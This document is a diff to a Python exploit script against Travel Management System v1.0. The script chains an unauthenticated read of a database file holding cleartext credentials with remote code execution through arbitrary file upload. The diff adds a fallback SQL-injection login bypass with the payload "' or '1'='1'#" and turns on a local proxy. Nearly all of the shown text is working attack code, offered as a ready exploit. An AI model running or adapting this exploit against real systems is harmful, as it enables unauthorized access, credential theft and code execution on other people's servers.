@@ -13,12 +13,12 @@
 # CVSS Temporal Score: 9.1 | CVSS Environmental Score: 9.1 | Modified Impact Subscore: 6.1
 # Tested On: Windows 10 (x64_86) + XAMPP | Python 2.7
 # Vulnerability Description:
-#   Travel Management System v1.0 suffers from insufficient permissions allowing unauthenticated access to the database file containing credentials stored in clear text. This exploit automates all steps required to retrieve credentials and gain Remote Code Execution through an arbitrary file upload vulnerability.
+#   Travel Management System v1.0 suffers from insufficient permissions allowing unauthenticated access to the database file containing credentials stored in clear text. This exploit automates all steps required to retrieve credentials and login with SQLi login bypass as a fail-safe and gain Remote Code Execution through an arbitrary file upload vulnerability.
 
 import requests, re, sys, os
 from colorama import Fore, Back, Style
 requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
-#proxies         = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}
+proxies         = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}
 F = [Fore.RESET,Fore.BLACK,Fore.RED,Fore.GREEN,Fore.YELLOW,Fore.BLUE,Fore.MAGENTA,Fore.CYAN,Fore.WHITE]
 B = [Back.RESET,Back.BLACK,Back.RED,Back.GREEN,Back.YELLOW,Back.BLUE,Back.MAGENTA,Back.CYAN,Back.WHITE]
 S = [Style.RESET_ALL,Style.DIM,Style.NORMAL,Style.BRIGHT]
@@ -143,8 +143,19 @@ loginchk    = str(re.findall(r'Admin Links', auth.text))
 if loginchk == "[u'Admin Links']":
         print(ok+"Login successful.")
 else:
-        print(err+"Failed login. The database file may not reflect the phpmyadmin configuration. Try something else...")
-        sys.exit(-1)
+        print(err+"Failed login. The database file may not reflect the current phpmyadmin configuration. Trying login bypass...")
+#SQLi Login Bypass        
+        sqli_data  = {'t1':"' or '1'='1'#", 't2':'hyd3sec','sbmt':'LOGIN'}
+        print(info+"Attempting to execute SQLi bypass to login without credentials...")
+        #auth        = s.post(url=login_url, data=sqli_data, verify=False, proxies=proxies)
+        auth        = s.post(url=login_url, data=sqli_data, verify=False)
+        loginchk    = str(re.findall(r'Admin Links', auth.text))
+        # print(loginchk) # Debug - search login response for successful login
+        if loginchk == "[u'Admin Links']":
+           print(ok+"SQLi Login bypass successful.")
+        else:
+           print(err+"SQLi failed.")
+           sys.exit(-1)
 
 
 #3 | File Upload
